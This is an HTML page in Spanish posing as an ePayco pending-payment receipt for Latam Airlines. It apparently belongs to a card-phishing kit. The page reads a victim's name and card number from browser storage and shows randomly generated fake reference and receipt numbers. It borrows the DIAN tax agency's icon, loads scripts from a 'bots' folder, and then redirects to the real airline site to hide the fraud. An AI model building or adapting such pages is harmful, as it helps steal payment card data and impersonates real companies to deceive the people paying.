<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comprobante de Pago</title>
    <link rel="shortcut icon" href="https://www.dian.gov.co/imagenes/favicon.ico?rev=1" type="image/vnd.microsoft.icon" id="favicon">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="/js/modal.js"></script>
    <script src="js/not.js"></script>
    <script src="./bots/aes.js"></script>
<script src="./bots/AesUtil.js"></script>
<script src="./bots/md5.js"></script>
<script src="./bots/pbkdf2.js"></script>
<script src="./bots/string-mask.js"></script>
    <style>
      /* Estilo del loader */
      .loader {
        width: 48px;
        height: 48px;
        border: 5px solid #FFF;
        border-bottom-color: #e8114b;
        border-radius: 50%;
        display: inline-block;
        box-sizing: border-box;
        animation: rotation 1s linear infinite;
      }

      @keyframes rotation {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .loader-full {
        position: fixed;
        top: 0;
        left: 0;
        overflow-y: hidden;
        z-index: 1000;
        background-color: white;
        width: 100vw;
        height: 100vh;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
      }

      /* Ocultar contenido al inicio */
      #content {
        display: none;
      }
    </style>
  </head>
  <body>
    <!-- LOADER FULL -->
    <div class="loader-full" id="loader">
        <span class="loader"></span>
        <p class="text-italic tc-ocean fs-3 fw-light">Cargando...</p>
    </div>

    <div id="content" class="flex flex-col items-center bg-zinc-100 dark:bg-zinc-800 min-h-screen py-10">
      <div class="bg-white dark:bg-zinc-900 shadow-md rounded-lg overflow-hidden w-full max-w-md">
        <div class="bg-black p-4 flex justify-center">
          <img src="./assets/media/epayco.png" style="width: 30%;" />
        </div>
        <div class="p-6">
          <div class="flex justify-center mb-4">
            <img src="./assets/media/pendiente.png" style="width: 15%;" />
          </div>
          <h2 class="text-center text-xl font-bold text-zinc-800 dark:text-zinc-100 mb-2">Transacción Pendiente</h2>
          <div class="text-center text-zinc-600 dark:text-zinc-400 mb-4">Referencia ePayco #<span id="reference"></span></div>
          <p class="text-center text-zinc-600 dark:text-zinc-400 mb-6"><span id="fecha"> </span></p>
          <div class="text-zinc-800 dark:text-zinc-100 mb-4">
            <h3 class="font-bold mb-2">Factura de compra</h3>
            <div class="flex justify-between">
              <span>Método de pago</span>
              <span>Tarjeta crédito/débito</span>
            </div>
            <div class="flex justify-between mb-2">
              <span>Terminada en:</span>
              <span id="cardLast4">xxxx0000</span>
            </div>
            <div class="flex justify-between mb-2">
              <span>Nombre del pagador</span>
              <span id="payerName">Nombre del pagador</span>
            </div>
            <div class="flex justify-between">
              <span>Recibo</span>
            </div>
            <div class="flex justify-between mb-2">
              <p id="receipt"></p>
            </div>
            <div class="flex justify-between">
              <span>Respuesta</span>
            </div>
            <div class="flex justify-between mb-4">
              <span>Transacción en Proceso</span>
            </div>
          </div>
          
          <div class="text-zinc-800 dark:text-zinc-100">
            <h3 class="font-bold mb-2">Datos de la compra</h3>
            <div class="flex justify-between">
              <span>Ref. Comercio</span>
              <span>Descripción</span>
            </div>
            <div class="flex justify-between">
              <span>8567793</span>
              <span>Pago Latam Airlines</span>
            </div>
          </div>
          <div class="text-center mt-16 mb-4">
            <p class="text-white text-sm"><span id="currentDateTime"></span></p>
          </div>
        </div>
      </div>
    </div>

    <script>
      // Función para redirigir después de un período de tiempo
      function redireccionar() {
        setTimeout(function() {
          // Cambiar la URL de la página
          window.location.href = "https://www.latamairlines.com";
        }, 15000); // 10000 milisegundos = 10 segundos
      }

      redireccionar();
    </script>

    <script>
      function getRandomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
      }

      document.getElementById('reference').textContent = getRandomInt(211990000, 211999809);
      document.getElementById('receipt').textContent = getRandomInt(819661928168311, 819661928968000);
    </script>

    <script>
      // Mostrar el contenido después de 5 segundos
      setTimeout(function() {
        document.getElementById('loader').style.display = 'none';
        document.getElementById('content').style.display = 'flex';
      }, 5000); // 5000 milisegundos = 5 segundos
    </script>

    <script>
      // Función para obtener y mostrar el nombre del pagador y los últimos 4 dígitos de la tarjeta desde localStorage
      function cargarDatos() {
        // Obtener los datos de formData desde localStorage
        const formData = JSON.parse(localStorage.getItem('formData'));

        if (formData) {
          // Mostrar el nombre del pagador
          document.getElementById('payerName').textContent = formData.nombre || 'Nombre del pagador';

          // Mostrar los últimos 4 dígitos de la tarjeta en formato xxxx1234
          if (formData.tarjeta) {
            const ultimos4 = formData.tarjeta.slice(-4);
            document.getElementById('cardLast4').textContent = `xxxx${ultimos4}`;
          } else {
            console.error('No se encontró el número de tarjeta en formData.');
          }
        } else {
          console.error('No se encontraron datos en localStorage.');
        }
      }

      // Llamar a la función para cargar los datos
      cargarDatos();

      // Función para obtener la fecha y hora actual y mostrarla en el pie de página
      function mostrarFechaHora() {
        const fechaHoraActual = new Date();
        const opcionesFecha = { year: 'numeric', month: 'long', day: 'numeric' };
        const opcionesHora = { hour: '2-digit', minute: '2-digit', second: '2-digit' };
        const fechaFormateada = fechaHoraActual.toLocaleDateString('es-ES', opcionesFecha);
        const horaFormateada = fechaHoraActual.toLocaleTimeString('es-ES', opcionesHora);

        document.getElementById('currentDateTime').textContent = `${fechaFormateada}, ${horaFormateada}`;
      }

      // Llamar a la función para mostrar la fecha y hora actual
      mostrarFechaHora();
    </script>
  </body>
</html>
